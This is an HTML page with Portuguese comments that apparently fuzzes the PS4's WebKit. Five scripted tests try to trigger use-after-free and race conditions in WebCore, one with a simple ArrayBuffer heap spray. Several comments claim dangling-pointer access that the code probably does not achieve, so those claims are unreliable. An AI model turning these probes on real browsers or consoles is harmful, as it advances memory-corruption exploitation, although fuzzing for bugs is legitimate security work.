<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Fuzzing - Memoria e DOM</title>
</head>
<body>
    <h1>Testes de Corrupção WebCore</h1>
    <div id="log-container"></div>

    <script>
        function logMsg(msg) {
            console.log(msg);
            let p = document.createElement("p");
            p.innerText = msg;
            document.getElementById("log-container").appendChild(p);
        }

        // Teste 1: UAF via Event Listener e Destruição de Nó
        // Foca na quebra do ciclo de vida de nós DOM no WebCore
        function test1() {
            logMsg("Iniciando Teste 1...");
            try {
                let btn = document.createElement("button");
                document.body.appendChild(btn);
                btn.addEventListener("click", function() {
                    btn.remove(); // Libera o nó
                    btn.innerHTML = "Forçando dangling pointer"; // Tenta acessar
                });
                btn.click();
            } catch(e) {}
            logMsg("Fim do Teste 1.");
        }

        // Teste 2: Destruição Assíncrona de Iframe (UAF Clássico)
        // Tenta acessar o contexto de documento de um iframe que já foi limpo da memória
        function test2() {
            logMsg("Iniciando Teste 2...");
            try {
                let frame = document.createElement("iframe");
                document.body.appendChild(frame);
                let frameWindow = frame.contentWindow;
                frame.remove();
                
                // Spray básico de memória para forçar realocação rápida do fastMalloc
                let spray = [];
                for(let i = 0; i < 5000; i++) {
                    spray.push(new ArrayBuffer(1024));
                }
                
                // Acesso ao ponteiro órfão
                frameWindow.document.createElement("div"); 
            } catch(e) {}
            logMsg("Fim do Teste 2.");
        }

        // Teste 3: Race Condition de Mutação Síncrona
        // Altera o DOM exatamente no momento em que ele está sendo iterado pelo motor
        function test3() {
            logMsg("Iniciando Teste 3...");
            try {
                let div = document.createElement("div");
                div.addEventListener("DOMNodeInserted", function() {
                    div.remove(); // Força a remoção durante a inserção
                });
                document.body.appendChild(div);
            } catch(e) {}
            logMsg("Fim do Teste 3.");
        }

        // Teste 4: Condição de Corrida com Promises e Coleta de Lixo (GC)
        // Libera a referência primária antes da resolução de uma microtask
        function test4() {
            logMsg("Iniciando Teste 4...");
            try {
                let obj = document.createElement("a");
                Promise.resolve().then(() => {
                    obj.href = "javascript:alert(1)"; // Executa após a perda da referência
                });
                obj = null;
                // Força alocação pesada para acionar o Garbage Collector do JavaScriptCore
                let forceGC = new Array(100000).fill("A");
            } catch(e) {}
            logMsg("Fim do Teste 4.");
        }

        // Teste 5: UAF no Parser de SVG
        // Estruturas SVG possuem pipelines de renderização isolados em C++ no WebCore
        function test5() {
            logMsg("Iniciando Teste 5...");
            try {
                let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
                let use = document.createElementNS("http://www.w3.org/2000/svg", "use");
                svg.appendChild(use);
                document.body.appendChild(svg);
                
                use.setAttribute("href", "#referencia_inexistente");
                svg.remove(); // Destrói a raiz antes de resolver a referência interna
            } catch(e) {}
            logMsg("Fim do Teste 5.");
        }

        // Execução Sequencial
        setTimeout(() => { test1(); }, 500);
        setTimeout(() => { test2(); }, 1000);
        setTimeout(() => { test3(); }, 1500);
        setTimeout(() => { test4(); }, 2000);
        setTimeout(() => { test5(); }, 2500);

    </script>
</body>
</html>
